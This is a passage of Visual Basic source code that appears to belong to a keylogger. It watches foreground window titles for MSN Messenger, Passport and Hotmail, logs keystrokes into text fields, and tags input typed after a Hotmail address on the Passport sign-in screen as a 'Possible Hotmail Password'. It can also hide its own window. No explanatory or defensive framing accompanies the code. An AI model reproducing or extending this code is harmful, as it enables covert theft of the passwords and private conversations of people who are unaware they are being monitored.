If GetCaption(GetForegroundWindow) = OldCaption Then Else MSN.Text = MSN.Text & "[" & GetCaption(GetForegroundWindow) & "]"
GoTo Adder
End If
If Mid(Active, IntLeft, 7) = "Instant" Then
MSNactive = True
If GetCaption(GetForegroundWindow) = OldCaption Then Else MSN.Text = MSN.Text & "[" & GetCaption(GetForegroundWindow) & "]"
GoTo Adder
End If
If Mid(Active, IntLeft, 7) = "Messeng" Then
MSNactive = True
If GetCaption(GetForegroundWindow) = OldCaption Then Else MSN.Text = MSN.Text & "[" & GetCaption(GetForegroundWindow) & "]"
GoTo Adder
End If
If Mid(Active, IntLeft, 4) = "Chat" Then
MSNactive = True
If GetCaption(GetForegroundWindow) = OldCaption Then Else MSN.Text = MSN.Text & "[" & GetCaption(GetForegroundWindow) & "]"
GoTo Adder
End If
If Mid(Active, IntLeft, 7) = "Passpor" Then
MSNactive = True
If GetCaption(GetForegroundWindow) = OldCaption Then Else MSN.Text = MSN.Text & "[" & GetCaption(GetForegroundWindow) & "]"
GoTo Adder
Else
MSNactive = False
If IntLeft + 8 > Len(GetCaption(GetForegroundWindow)) Then
GoTo Adder
Else
IntLeft = IntLeft + 1
GoTo Hotmail
End If
End If

Adder:

If OldCaption = "Sign in to Passport - MSN Messenger Service" Then
EmailAddy = AddKey
If Right(MSN, 12) = "@hotmail.com" Then
AddKey = vbTab & "Possible Hotmail Password : "
End If
End If
If Right(MSN, 13) = "@hotmail.com" & vbTab & vbTab Then MSN = Left(MSN, Len(MSN) - 1)

If MSNactive = True Then
MSN = MSN & AddKey
Else
Text1.Text = Text1.Text & AddKey
End If
If AddKey = vbCrLf & " [" & GetCaption(GetForegroundWindow) & "] " & vbCrLf Then AddKey = ""
AddKey = ""


If Label1.Caption = "Logger" Then
Me.Visible = True
Me.Show
Else
If Check1.Value = 1 Then Me.Hide
End If

End Sub
